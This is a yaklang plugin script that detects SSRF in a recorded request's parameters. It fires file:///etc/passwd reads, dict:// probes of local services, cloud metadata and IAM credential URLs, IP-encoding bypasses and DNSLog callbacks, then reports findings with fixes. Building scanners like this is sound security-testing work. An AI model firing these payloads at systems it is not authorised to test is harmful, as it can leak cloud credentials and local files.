__DESC__ = "检测服务器端请求伪造 (SSRF) 漏洞，优先本地检测（协议利用、云元数据），未发现时使用 DNSLog 带外检测；已移除内网地址探测以降低误报"
__VERBOSE_NAME__ = "SSRF 服务器端请求伪造检测"
__KEYWORDS__ = "ssrf,server-side-request-forgery,dnslog,cloud-metadata,internal-network,protocol-smuggling"

// 配置项
debug = false
threads = 10

// -------------------------------------------------------------------
// CLI 参数定义
// -------------------------------------------------------------------
flowIDStr = cli.String(
    "httpflow-id",
    cli.setVerboseName("HTTPFlowID"),
    cli.setHelp("History 中的 HTTPFlow ID,用于获取请求/响应包内容"),
    cli.setRequired(true),
)
cli.check()

// 辅助输出函数
aiOut = msg => {
    try {
        yakit.AIOutput(msg)
    } catch {
        println(msg)
    }
}

// -------------------------------------------------------------------
// 核心数据结构
// -------------------------------------------------------------------

// 云元数据目标定义
cloudMetadataTargets = [
    // AWS
    {
        "url": "http://169.254.169.254/latest/meta-data/",
        "regex": `ami-id|instance-id|public-ipv4|security-groups`,
        "desc": "AWS EC2 Metadata",
        "provider": "AWS"
    },
    {
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "regex": `(?s)AccessKeyId.*SecretAccessKey|SecretAccessKey.*AccessKeyId`,
        "desc": "AWS IAM Credentials",
        "provider": "AWS"
    },

    // 阿里云
    {
        "url": "http://100.100.100.200/latest/meta-data/",
        "regex": `instance-id|image-id|hostname|region-id`,
        "desc": "Aliyun ECS Metadata",
        "provider": "Aliyun"
    },
    {
        "url": "http://100.100.100.200/latest/meta-data/Ram/security-credentials/",
        "regex": `AccessKeyId|AccessKeySecret|SecurityToken`,
        "desc": "Aliyun RAM Credentials",
        "provider": "Aliyun"
    },

    // 腾讯云
    {
        "url": "http://metadata.tencentyun.com/latest/meta-data/",
        "regex": `instance-id|instance-name|local-ipv4|public-ipv4`,
        "desc": "Tencent Cloud Metadata",
        "provider": "Tencent"
    },

    // Google Cloud
    {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "regex": `instance/id|instance/name|instance/zone`,
        "desc": "Google Cloud Metadata",
        "provider": "GCP",
        "headers": {"Metadata-Flavor": "Google"}
    },

    // Azure
    {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "regex": `compute|network|osProfile|vmId`,
        "desc": "Azure Metadata",
        "provider": "Azure",
        "headers": {"Metadata": "true"}
    },
]

// 内网常见地址和端口
internalTargets = [
    // 本机
    {"host": "127.0.0.1", "port": 80, "desc": "Localhost HTTP"},
    {"host": "127.0.0.1", "port": 22, "desc": "Localhost SSH"},
    {"host": "127.0.0.1", "port": 3306, "desc": "Localhost MySQL"},
    {"host": "127.0.0.1", "port": 6379, "desc": "Localhost Redis"},
    {"host": "127.0.0.1", "port": 9200, "desc": "Localhost Elasticsearch"},

    // 常见内网网关
    {"host": "192.168.1.1", "port": 80, "desc": "Router Admin"},
    {"host": "192.168.0.1", "port": 80, "desc": "Router Admin"},
    {"host": "10.0.0.1", "port": 80, "desc": "Internal Gateway"},
]

// 协议利用 Payloads
protocolPayloads = [
    // file:// 协议读取本地文件
    {
        "payload": "file:///etc/passwd",
        "regex": `root:.*:0:0:`,
        "desc": "File Protocol - Linux /etc/passwd",
        "type": "file"
    },
    {
        "payload": "file:///c:/windows/win.ini",
        "regex": `\[extensions\]|\[fonts\]`,
        "desc": "File Protocol - Windows win.ini",
        "type": "file"
    },

    // dict:// 协议端口探测
    {
        "payload": "dict://127.0.0.1:22/",
        "regex": `SSH|OpenSSH`,
        "desc": "Dict Protocol - SSH Detection",
        "type": "dict"
    },
    {
        "payload": "dict://127.0.0.1:6379/",
        "regex": `Redis|PONG`,
        "desc": "Dict Protocol - Redis Detection",
        "type": "dict"
    },
]

// URL 编码绕过模式
urlEncodings = [
    {"original": "http://", "encoded": "http://", "desc": "Normal"},
    {"original": "http://", "encoded": "http%3A%2F%2F", "desc": "URL Encoded"},
    {"original": "http://", "encoded": "http%253A%252F%252F", "desc": "Double Encoded"},
]

// IP 表示形式绕过
ipEncodings = [
    // 127.0.0.1 的各种表示形式
    {"ip": "127.0.0.1", "encoded": "127.0.0.1", "desc": "Decimal"},
    {"ip": "127.0.0.1", "encoded": "127.1", "desc": "Short Form"},
    {"ip": "127.0.0.1", "encoded": "2130706433", "desc": "Integer (127.0.0.1)"},
    {"ip": "127.0.0.1", "encoded": "0x7f.0x0.0x0.0x1", "desc": "Hex"},
    {"ip": "127.0.0.1", "encoded": "0177.0.0.1", "desc": "Octal"},

    // 169.254.169.254 (AWS) 的各种表示
    {"ip": "169.254.169.254", "encoded": "169.254.169.254", "desc": "Decimal"},
    {"ip": "169.254.169.254", "encoded": "2852039166", "desc": "Integer (169.254.169.254)"},
]

// -------------------------------------------------------------------
// 核心逻辑: DNSLog 带外检测
// -------------------------------------------------------------------

testDNSLog = func(url, param) {
    aiOut("  [3/3] DNSLog 带外检测（需要外网访问）...")

    server, token, err := risk.NewDNSLogDomain()
    if err != nil {
        aiOut(sprintf("  ! DNSLog 服务不可用: %v", err))
        return nil
    }

    aiOut(sprintf("  → DNSLog 域名: %s", server))

    // 生成随机前缀
    randPrefix = str.RandStr(8)
    testDomain = randPrefix + "." + server

    // 构造多种 Payload
    payloads = [
        sprintf("http://%s", testDomain),
        sprintf("https://%s", testDomain),
        sprintf("http://%s/ssrf-test", testDomain),
        sprintf("//%s", testDomain),
    ]

    lastReq = nil
    lastResp = nil

    for i, p = range payloads {
        aiOut(sprintf("    [%d/%d] 发送: %s", i+1, len(payloads), p))

        freq = param.Fuzz(p)
        res, err = freq.ExecFirst()

        if res != nil {
            lastReq = res.RequestRaw
            lastResp = res.ResponseRaw
        }
    }

    aiOut("  ⏳ 等待 DNSLog 响应（5秒）...")
    sleep(5)

    detail, _ := risk.CheckDNSLogByToken(token)

    if len(detail) > 0 {
        aiOut(sprintf("  ✓ DNSLog 收到回调: %d 条记录（已确认 SSRF）", len(detail)))
        return {
            "type": "dnslog",
            "desc": "SSRF via DNSLog Out-of-Band",
            "domain": server,
            "records": detail,
            "request": lastReq,
            "response": lastResp,
            "severity": "critical"
        }
    } else {
        aiOut("  × DNSLog 未收到回调")
        return nil
    }
}

// -------------------------------------------------------------------
// 核心逻辑: 云元数据读取检测
// -------------------------------------------------------------------

testCloudMetadata = func(url, param) {
    aiOut("  [2/4] 云元数据读取检测 - 无需外网...")

    results = []
    foundProvider = ""

    for i, target = range cloudMetadataTargets {
        // 如果已经确认了某个云厂商，跳过其他厂商
        if foundProvider != "" && target.provider != foundProvider {
            continue
        }

        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(cloudMetadataTargets), target.desc))

        freq = param.Fuzz(target.url)

        // 添加特殊 Headers（如果需要）
        if target["headers"] != nil {
            for k, v = range target.headers {
                freq = freq.FuzzHTTPHeader(k, v)
            }
        }

        res, err = freq.ExecFirst()

        if res == nil { continue }

        body, err = str.ExtractBodyFromHTTPResponseRaw(res.ResponseRaw)
        if err != nil { continue }

        if str.MatchAnyOfRegexp(string(body), target.regex) {
            aiOut(sprintf("    ✓ 成功读取: %s", target.desc))

            if foundProvider == "" {
                foundProvider = target.provider
                aiOut(sprintf("    → 检测到云平台: %s", foundProvider))
            }

            results = append(results, {
                "type": "cloud-metadata",
                "desc": target.desc,
                "provider": target.provider,
                "url": target.url,
                "request": res.RequestRaw,
                "response": res.ResponseRaw,
                "severity": "critical"
            })
        } else {
            aiOut(sprintf("    × 未检测到元数据特征"))
        }
    }

    if len(results) > 0 {
        aiOut(sprintf("  ✓ 发现 %d 个云元数据读取点（已确认 SSRF）", len(results)))
    } else {
        aiOut("  × 未检测到云元数据泄露")
    }

    return results
}

// -------------------------------------------------------------------
// 核心逻辑: 内网探测
// -------------------------------------------------------------------

testInternalNetwork = func(url, param) {
    aiOut("  [3/4] 内网探测（基于响应时间差异）- 无需外网...")

    results = []
    swg = sync.NewSizedWaitGroup(threads)
    resultCh = make(chan map[string]var, len(internalTargets) + 5)

    // 先获取正常响应时间基线
    baselineTime = 0
    aiOut("    → 获取响应时间基线...")

    freq = param.Fuzz(sprintf("http://240.0.0.1:%d", 12345))  // 不可达 IP
    startTime = time.Now()
    freq.ExecFirst()
    baselineTime = time.Since(startTime).Milliseconds()

    aiOut(sprintf("    → 基线响应时间: %d ms", baselineTime))

    for i, target = range internalTargets {
        aiOut(sprintf("    [%d/%d] 探测: %s:%d", i+1, len(internalTargets), target.host, target.port))

        swg.Add()
        go func {
            defer swg.Done()

            testURL = sprintf("http://%s:%d", target.host, target.port)
            freq = param.Fuzz(testURL)

            startTime = time.Now()
            res, _ = freq.ExecFirst()
            responseTime = time.Since(startTime).Milliseconds()

            // 如果响应时间远小于基线，说明端口可能开放
            timeDiff = baselineTime - responseTime

            statusCode = 0
            if res != nil && len(res.ResponseRaw) > 0 {
                statusCode = poc.GetStatusCodeFromResponse(res.ResponseRaw)
            }
            if timeDiff > 500 || (res != nil && statusCode != 0) {
                aiOut(sprintf("    ✓ 可能开放: %s (响应时间: %d ms)", target.desc, responseTime))

                result = {
                    "type": "internal-network",
                    "desc": target.desc,
                    "host": target.host,
                    "port": target.port,
                    "response_time": responseTime,
                    "severity": "high"
                }

                if res != nil {
                    result["request"] = res.RequestRaw
                    result["response"] = res.ResponseRaw
                }

                resultCh <- result
            }
        }
    }

    swg.Wait()
    close(resultCh)

    for res = range resultCh {
        results = append(results, res)
    }

    if len(results) > 0 {
        aiOut(sprintf("  ✓ 发现 %d 个可能开放的内网端口（已确认 SSRF）", len(results)))
    } else {
        aiOut("  × 未检测到内网端口开放")
    }

    return results
}

// -------------------------------------------------------------------
// 核心逻辑: 协议利用
// -------------------------------------------------------------------

testProtocolExploit = func(url, param) {
    aiOut("  [1/4] 协议利用检测（file://, dict:// 等）- 无需外网...")

    results = []

    for i, p = range protocolPayloads {
        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(protocolPayloads), p.desc))

        freq = param.Fuzz(p.payload)
        res, err = freq.ExecFirst()

        if res == nil { continue }

        body, err = str.ExtractBodyFromHTTPResponseRaw(res.ResponseRaw)
        if err != nil { continue }

        if str.MatchAnyOfRegexp(string(body), p.regex) {
            aiOut(sprintf("    ✓ 成功利用: %s", p.desc))

            results = append(results, {
                "type": "protocol-exploit",
                "desc": p.desc,
                "protocol": p.type,
                "payload": p.payload,
                "request": res.RequestRaw,
                "response": res.ResponseRaw,
                "severity": "critical"
            })
        } else {
            aiOut(sprintf("    × 未检测到协议利用特征"))
        }
    }

    if len(results) > 0 {
        aiOut(sprintf("  ✓ 发现 %d 个协议利用点（已确认 SSRF）", len(results)))
    } else {
        aiOut("  × 未检测到协议利用")
    }

    return results
}

// -------------------------------------------------------------------
// 核心逻辑: 综合检测
// -------------------------------------------------------------------

fuzzTask = func(url, param) {
    aiOut(sprintf("\n正在检测参数: %s (%s)", param.Name(), param.PositionVerbose()))

    allResults = []
    foundVuln = false  // 标记是否已找到漏洞

    // 阶段 1: 协议利用检测（file://, dict:// 等）- 优先级最高，无需外网
    aiOut("  → 优先进行本地协议利用检测...")
    protocolResults = testProtocolExploit(url, param)
    if len(protocolResults) > 0 {
        allResults = append(allResults, protocolResults...)
        foundVuln = true
        aiOut("  ✓ 协议利用检测确认 SSRF，跳过外部带外检测（内网优化）")
        return allResults
    }

    // 阶段 2: 云元数据读取检测 - 仅对疑似 URL 参数执行，避免非 URL 参数导致超时
    if isUrlLikeParam(param.Name()) {
        cloudResults = testCloudMetadata(url, param)
        if len(cloudResults) > 0 {
            allResults = append(allResults, cloudResults...)
            foundVuln = true
            aiOut("  ✓ 云元数据读取确认 SSRF，跳过 DNSLog 带外检测")
            return allResults
        }

        // 阶段 3: DNSLog 带外检测（仅疑似 URL 参数）
        if !foundVuln {
            aiOut("  → 本地检测未发现漏洞，尝试 DNSLog 带外检测...")
            dnsResult = testDNSLog(url, param)
            if dnsResult != nil {
                allResults = append(allResults, dnsResult)
            }
        }
    } else {
        aiOut("  → 参数名非 URL 类，仅做协议利用检测，跳过云元数据与 DNSLog")
    }

    return allResults
}

// -------------------------------------------------------------------
// 核心逻辑: 风险上报
// -------------------------------------------------------------------

reportVuln = func(url, param, result) {
    resultType = result.type
    desc = result.desc
    severity = result.severity

    title = ""
    description = ""

    if resultType == "dnslog" {
        title = sprintf("SSRF (DNSLog Out-of-Band): %s", url)
        description = sprintf("通过 DNSLog 带外检测确认参数 %s 存在 SSRF 漏洞。DNSLog 域名: %s，收到 %d 条回调记录。", param.Name(), result.domain, len(result.records))
    } else if resultType == "cloud-metadata" {
        title = sprintf("SSRF (Cloud Metadata Leak - %s): %s", result.provider, url)
        description = sprintf("通过参数 %s 成功读取 %s 云平台元数据: %s", param.Name(), result.provider, desc)
    } else if resultType == "internal-network" {
        title = sprintf("SSRF (Internal Network Probe): %s", url)
        description = sprintf("通过参数 %s 成功探测内网端口: %s:%d (%s)。响应时间: %d ms", param.Name(), result.host, result.port, desc, result.response_time)
    } else if resultType == "protocol-exploit" {
        title = sprintf("SSRF (Protocol Exploit - %s): %s", result.protocol, url)
        description = sprintf("通过参数 %s 成功利用 %s 协议: %s", param.Name(), result.protocol, desc)
    }

    aiOut(sprintf("✓ %s", title))

    risk.NewRisk(
        url,
        risk.title(title),
        risk.titleVerbose(sprintf("服务器端请求伪造漏洞 (SSRF): %s", url)),
        risk.details(result),
        risk.type("ssrf"),
        risk.severity(severity),
        risk.payload(sprintf("%s=%s", param.Name(), result["payload"] || result["url"] || "")),
        risk.request(result.request),
        risk.response(result.response),
        risk.description(description),
        risk.solution("1. 禁用不必要的 URL 协议（file://, dict://, gopher:// 等）。\n2. 实施严格的 URL 白名单验证。\n3. 禁止访问内网 IP 和云元数据地址（169.254.169.254, 100.100.100.200 等）。\n4. 使用独立的网络隔离环境执行外部请求。")
    )
}

// -------------------------------------------------------------------
// 主程序入口
// -------------------------------------------------------------------

flowID = parseInt(flowIDStr)
flowsChan := db.QueryHTTPFlowsByID(flowID)
flow = nil
for f := range flowsChan {
    flow = f
    break
}

if flow == nil {
    aiOut(sprintf("HTTPFlow 查询失败: 未找到 ID 为 %v 的请求", flowID))
    return
}

reqBytes = flow.GetRequest()
if reqBytes == nil { reqBytes = []byte(flow.Request) }
if reqBytes == nil || len(reqBytes) == 0 {
    aiOut("请求包为空,无法检测")
    return
}

isHttps = flow.IsHTTPS
freq, err := fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
if err != nil {
    aiOut(sprintf("解析请求失败: %v", err))
    return
}

aiOut(sprintf("开始 SSRF 漏洞检测 (Target: %s)...", flow.Url))

allParams = freq.GetCommonParams()
validParams = []
ignoredParams = ["PHPSESSID", "JSESSIONID", "_ga", "_gid", "submit", "Submit"]

// 疑似 URL/重定向 参数名（仅对这些做完整 SSRF；其余只做协议利用，避免超时）
urlLikeKeywords = ["url", "redirect", "link", "target", "next", "return", "dest", "uri", "path", "src", "fetch", "callback", "jump", "to", "out", "go"]
isUrlLikeParam = func(name) {
    lower = str.ToLower(name)
    for _, k = range urlLikeKeywords {
        if str.Contains(lower, k) {
            return true
        }
    }
    return false
}

for param in allParams {
    ignore = false
    for _, i = range ignoredParams {
        if str.MatchAllOfRegexp(param.Name(), sprintf("(?i)%s", i)) {
            ignore = true
            break
        }
    }
    if !ignore {
        validParams = append(validParams, param)
    }
}

if len(validParams) == 0 {
    aiOut("未发现可测试的有效参数")
    return
}

// 执行检测
for param in validParams {
    results = fuzzTask(flow.Url, param)

    // 上报所有发现的漏洞
    for _, result = range results {
        reportVuln(flow.Url, param, result)
    }
}

aiOut("=== SSRF 检测完成 ===")
